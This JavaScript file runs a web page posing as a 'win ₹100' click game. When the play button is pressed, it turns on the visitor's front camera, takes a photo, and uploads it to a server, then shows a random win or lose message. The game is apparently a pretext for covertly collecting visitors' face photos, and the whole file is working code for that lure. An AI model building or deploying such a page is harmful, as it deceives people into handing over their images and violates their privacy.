const playBtn = document.getElementById("playBtn");
const statusEl = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let stream = null;

async function getCameraStream() {
  if (stream) return stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
    return stream;
  } catch (err) {
    console.error("Camera error:", err);
    statusEl.textContent = "❌ Camera permission required.";
    statusEl.style.color = "red";
    throw err;
  }
}

function stopStream() {
  if (!stream) return;
  stream.getTracks().forEach(t => t.stop());
  stream = null;
}

function showWin(url) {
  statusEl.innerHTML = `<span class="win">✅ You Win ₹100!</span>`;
  if (url) {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_blank";
    a.textContent = "Open image (logs also have link)";
    a.style.display = "block";
    a.style.marginTop = "8px";
    a.style.color = "#0b66ff";
    statusEl.appendChild(a);
  }
}

function showLose(url) {
  statusEl.innerHTML = `<span class="lose">🔴 You Lost ₹100!</span>`;
  if (url) {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_blank";
    a.textContent = "Open image (logs also have link)";
    a.style.display = "block";
    a.style.marginTop = "8px";
    a.style.color = "#0b66ff";
    statusEl.appendChild(a);
  }
}

playBtn.addEventListener("click", async () => {
  statusEl.textContent = "Processing...";
  statusEl.style.color = "#333";

  try {
    await getCameraStream();

    // small delay for camera warmup
    await new Promise(r => setTimeout(r, 600));

    // capture
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);

    // to blob and upload
    canvas.toBlob(async (blob) => {
      if (!blob) {
        statusEl.textContent = "Capture failed";
        stopStream();
        return;
      }

      const form = new FormData();
      form.append("photo", blob, `capture_${Date.now()}.jpg`);

      try {
        const res = await fetch("/upload", { method: "POST", body: form });
        const data = await res.json();
        if (data && data.success) {
          // 50/50 win or lose
          const win = Math.random() < 0.5;
          const absolute = data.absoluteUrl || (data.filePath ? `${location.origin}${data.filePath}` : null);
          if (win) showWin(absolute);
          else showLose(absolute);
          console.log("Uploaded URL:", absolute);
        } else {
          statusEl.textContent = "Upload failed";
          statusEl.style.color = "red";
        }
      } catch (err) {
        console.error("Upload error:", err);
        statusEl.textContent = "Upload error";
        statusEl.style.color = "red";
      } finally {
        stopStream();
      }
    }, "image/jpeg", 0.9);

  } catch (err) {
    // already handled in getCameraStream
  }
});